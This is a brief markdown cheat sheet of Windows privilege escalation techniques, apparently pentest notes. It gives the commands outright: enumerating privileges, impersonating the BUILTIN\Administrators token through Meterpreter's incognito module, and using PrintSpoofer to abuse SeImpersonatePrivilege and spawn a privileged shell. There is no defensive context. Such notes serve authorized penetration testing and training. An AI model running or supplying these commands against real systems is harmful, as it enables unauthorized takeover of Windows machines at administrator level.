# Windows privilege escalation methods

## Display current user privileges
```bash
whoami /priv
```

## SeDebugPrivilege / SeImpersonatePrivilege
In meterpreter:
```bash
load incognito
list_tokens -g
impersonate_token "BUILTIN\Administrators"
```

## SeImpersonatePrivilege / SeAssignPrimaryTokenPrivilege
```bash
PrintSpoofer64.exe -i -c cmd.exe
```
